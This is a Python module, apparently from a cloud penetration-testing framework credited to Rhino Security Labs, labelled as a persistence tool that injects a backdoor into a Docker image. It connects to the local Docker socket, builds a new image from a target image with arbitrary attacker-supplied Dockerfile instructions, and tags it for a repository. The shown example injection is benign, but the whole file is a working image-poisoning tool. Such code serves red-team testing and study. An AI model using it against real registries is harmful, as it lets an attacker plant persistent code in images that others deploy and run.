from io import BytesIO
import sys

import docker, fire


module_info = {
    'name': 'docker__backdoor',
    'author': 'Jack Ganbold of Rhino Security Labs',
    'category': 'PERSIST',
    'one_liner': 'Inject backdoor into a docker image.',
    'description': 'Inject backdoor into a docker image.',
    'services': ['Docker'],
    'prerequisite_modules': [],
    'external_dependencies': [],
    'arguments_to_autocomplete': [],
}


def get_dockerfile_like_obj(target_image, injection):
    dockerfile = 'FROM {}\n{}'.format(target_image, injection)
    return BytesIO(dockerfile.encode('utf-8'))


def docker_build(docker_client, target_image, injected_image, injection):
    docker_fileobj=get_dockerfile_like_obj(target_image, injection)
    return docker_client.images.build(fileobj=docker_fileobj, rm=True, tag=injected_image)


def main(args):
    data  = {
        'count': 0,
        'payload': {}
    }

    target_image = args['repository_uri'] + ":" + args['target_image_tag'] 
    injected_image = args['repository_uri'] + ":" + args['build_image_tag'] 
    docker_client = docker.DockerClient(base_url='unix:///var/run/docker.sock')

    try:
        docker_build_response = docker_build(docker_client, target_image, injected_image, args['injection'])

        out = 'Built {} and injected'.format(docker_build_response)
        print(out)

        data['payload'].update({
            'repository_uri': args['repository_uri'],
            'target_image_tag': args['target_image_tag'],
            'build_image_tag': args['build_image_tag'],
            'injection': args['injection']
        })
        data['count'] = 1
        
    except Exception as e:
        print(e, file=sys.stderr)

    return data


def summary(data):
    out = '{} Images injected'.format(data['count'])
    return out


def set_args(repository_uri, target_image_tag, build_image_tag, injection):
    args = {
        'repository_uri': repository_uri,
        'target_image_tag': target_image_tag,
        'build_image_tag':build_image_tag,
        'injection': injection
    }

    return args


# Run it with sdtin, sdtout, sdterr
#   standard input	0>
#   standard output	1>
#   standard error	2>
#
#   Example:
        # python ./modules/docker__backdoor/main.py \
        # 0> echo nginx latest backdoored 'RUN echo haha > ccat2.txt' \
        # 2> docker_err.txt \
        # 1> docker_out.txt
if __name__ == "__main__":
    print('Running module {}...'.format(module_info['name']))

    args= fire.Fire(set_args)
    data = main(args)

    if data is not None:
        summary = summary(data)
        if len(summary) > 1000:
            raise ValueError('The {} module\'s summary is too long ({} characters). Reduce it to 1000 characters or fewer.'.format(module_info['name'], len(summary)))
        if not isinstance(summary, str):
            raise TypeError(' The {} module\'s summary is {}-type instead of str. Make summary return a string.'.format(module_info['name'], type(summary)))
        
        print('{} completed.\n'.format(module_info['name']))
        print('MODULE SUMMARY:\n\n{}\n'.format(summary.strip('\n')))   
        